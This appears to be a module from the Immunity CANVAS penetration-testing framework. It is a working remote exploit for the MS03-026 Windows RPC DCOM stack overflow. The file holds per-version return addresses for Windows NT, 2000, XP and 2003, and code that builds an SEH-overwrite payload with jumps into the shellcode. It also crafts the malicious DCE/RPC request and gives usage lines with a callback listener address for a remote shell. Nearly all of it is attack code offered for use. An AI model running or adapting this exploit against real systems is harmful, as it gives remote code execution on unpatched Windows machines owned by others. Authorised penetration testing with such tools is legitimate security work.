#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003-2007
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
import struct

if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from libs.newsmb.libdcerpc import s_dce_raw_unistring
import canvasengine
from msrpcexploit import msrpcexploit
from MOSDEF import mosdef

# GUI info
NAME='Microsoft Windows RPC Interface Overflow (MS03-026)'
DESCRIPTION='Microsoft Windows RPC Interface Stack Overflow'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='07/16/03'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/bulletin/MS03-026.mspx'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION["CVE Name"] = "CVE-2003-0352"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0352"
DOCUMENTATION['CVSS'] = 7.5
VERSION='1.0'
PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['NT','2000','XP','2003']
PROPERTY['MSADV']='MS03-026'

CHANGELOG="""
KK 01/17/07:
Rewritten
"""

NOTES="""
Tested on:
Windows NT 4.0 Server SP6a French OOTB
Windows 2000 Server SP1 English OOTB
Windows 2000 Server SP4 English OOTB
Windows 2000 Professional SP0 Simplified Chinese OOTB
Windows 2000 Server SP4 Japanese OOTB
Windows XP Professional SP0 English OOTB
Windows XP Professional SP1a English OOTB
Windows 2003 Standard SP0 English OOTB

Usage:
./exploits/ms03_026/ms03_026.py -v 0 -t 10.10.11.132 -l 10.10.11.1 -d 5555
./commandlineInterface.py -v 1 -p 5555 -i fromcreatethread
"""

DEBUGNOTES="""
Attach to svchost with RpcSs service under Windows XP Professional

"""

targets={
    0: ['Autoversioning',0],     
    1: ['Windows NT 4.0 SP6a',0x24654f], #jmp esi
    2: ['Windows 2000 SP0-SP4',0x187533], #jmp ebx
    3: ['Windows XP SP0-SP1a',0x01001c59], #pop&pop&ret
    4: ['Windows 2003 SP0 universal', 0x001b0b0b], #poppopret
    #target 4 does not work on VPC since they move memory around
    #need to check to make sure it's English/etc before
    #using this value, and otherwise use old value
    #you must defeat SafeSEH so you have to find 
    # call [ebp+30] or pop pop ret somewhere
    # in a non-text section
    5: ['Windows 2003 SP0 VPC',0x001b0b0b], #pop&pop&ret
}


class theexploit(msrpcexploit):
    def __init__(self):
        msrpcexploit.__init__(self)
        self.name                                 = NAME
        self.port                                 = 135
        self.host                                 = ''
        self.version                              = 0
        self.badstring                            = '\x00\xff'
        self.UUID                                 = u'4d9f4ab8-7d1c-11cf-861e-0020af6e7c57'
        self.uuidversion                          = u'0.0'
        self.targetfunction                       = 0
        self.listenerArgsDict['fromcreatethread'] = 1
        self.autoversion                          = 1
    
    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
                                            
    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        self.user=self.argsDict.get('user',self.user)
        self.password=self.argsDict.get('password',self.password)
        if self.version==0: #we don't want result of testOS to be overwritten
            self.version=int(self.argsDict.get('version',self.version))

    def testOS(self):
        self.getArgs()
        app=self.engine.getModuleExploit('osdetect')
        app.link(self)
        devlog('ms03_026','target=%s->%s'%(self.target,app.target))
        result=app.run()
        if result==0:
            self.log('Unknown OS, automatic detection failed (try choosing a version)')
            return 0
        os=app.result
        if os.base!='Windows':
            self.log('Cannot attack non Windows with this exploit')
            return 0
        if not os.language:
            self.log('No language found, defaulting to engine\'s non-language option %s'%(self.engine.osdetect_mode))
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_NO_RUN:
                self.log('Not running, could not find language')
                return 0
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_ONE_LANG:
                self.log('Assuming language %s'% self.engine.osdetect_lang)
                os.language=self.engine.osdetect_lang
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_NEAREST_NEIGHBOR:
                self.log('Nearest neighbor algorithm not yet implemented')
                return 0
        self.log('version=%s'%(os.version))
        if os.version=='NT':
            self.log('Attacking Windows NT 4.0 language: %s'%(os.language))
            self.version=1
            return 1
        elif os.version=='2000':
            self.log('Attacking Windows 2000 language: %s'%(os.language))
            self.version=2
            return 1
        elif os.version=='XP':
            self.log('Attacking Windows XP language: %s'%(os.language))
            self.version=3
            return 1
        elif os.version=='2003':
            #this will be wrong if they are running 2003 on VPC!
            self.log('Attacking Windows 2003 language: %s'%(os.language))
            self.version=4
            return 1
        else:
            self.log('OS not vulnerable: %s'%(result))
        return 0

    def buildConnectionList(self):
        self.getArgs()
        host=self.host
        # added epmapper transport for 2003 IPv6 attack, needs to be first, stalls on just 445 port
        connectionList=['ncacn_np:%s[\\epmapper]'%(host),\
                        'ncacn_ip_tcp:%s[%d]'%(host,self.port),\
                        'ncacn_ip_tcp:%s[445]'%(host),\
                        'ncacn_ip_tcp:%s[1025]'%(host),\
                        'ncacn_ip_tcp:%s[1026]'%(host),\
                        'ncacn_ip_tcp:%s[1027]'%(host),\
                        'ncacn_ip_tcp:%s[1028]'%(host)]
        self.connectionList=connectionList
        return self.connectionList

    def buildDcePacket(self):
        self.log('version=%d'%(self.version))
        self.description,self.eip=targets[self.version]
        payload=''
        if self.version==1: #NT 4.0
            payload+='A'*0x28
            payload+='BBB\xff' #access violation
            payload+='C'*0x70 #needed because some data is overwritten in here
            offset=len(payload)
            payload+=self.shellcode
            payload+='D'*(0x418-len(payload))
            payload+='\xeb\x06' #jmp forward
            payload+='EE'
            payload+=struct.pack('<L',self.eip) #SEH
            payload+=mosdef.assemble('jmp $-%d'%(len(payload)-offset+5),'x86') #jmp backward
        elif self.version==2: #2000
            payload+='A'*0x2c
            payload+='BBB\xff' #access violation
            offset=len(payload)
            payload+=self.shellcode
            payload+='C'*(0x600-len(payload))
            payload+='\xeb\x06' #jmp forward
            payload+='DD'
            payload+=struct.pack('<L',self.eip) #SEH
            payload+=mosdef.assemble('jmp $-%d'%(len(payload)-offset+5),'x86') #jmp backward
        elif self.version==3: #XP
            payload+='A'*0x2c
            payload+='BBB\xff' #access violation
            offset=len(payload)
            payload+=self.shellcode
            payload+='C'*(0x5bc-len(payload))
            payload+='\xeb\x06' #jmp forward
            payload+='DD'
            payload+=struct.pack('<L',self.eip) #SEH
            payload+=mosdef.assemble('jmp $-%d'%(len(payload)-offset+5),'x86') #jmp backward
        elif self.version==4: #2003
            payload+='A'*0x30
            payload+='BBB\xff' #access violation
            offset=len(payload)
            payload+=self.shellcode
            payload+='C'*(0x580-len(payload))
            payload+='\xeb\x06' #jmp forward
            payload+='DD'
            payload+=struct.pack('<L',self.eip) #SEH
            payload+=mosdef.assemble('jmp $-%d'%(len(payload)-offset+5),'x86') #jmp backward
        data='\\\x00\\\x00'
        data+=payload
        if (len(data)%2)==1:
            data+='F'
        data+='\\\x00A\x00'
        packet=''
        #based on IDL recovered using mIDA
        packet+=struct.pack('<HHLL',5,1,0,0)
        packet+=struct.pack('<LHHBBBBBBBB',1,1,1,1,1,1,1,1,1,1,1)
        packet+=struct.pack('<L',0)
        packet+=struct.pack('<LHHBBBBBBBB',0,0,0,0,0,0,0,0,0,0,0)
        packet+=struct.pack('<L',1) #[unique]
        packet+=s_dce_raw_unistring(data)
        packet+=struct.pack('<L',0)
        packet+=struct.pack('<LL',1,1)
        packet+=struct.pack('<LL',1,1)
        packet+=struct.pack('<LL',1,1)
        packet+=struct.pack('<LLLLLL',1,1,1,1,1,1)
        return packet

    def displayVersions(self):
        i=0
        for listline in targets.values():
            print '%d: %s'%(i,listline[0])
            i=i+1

if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None] and hasattr(ret,'interact'):
        ret.interact()
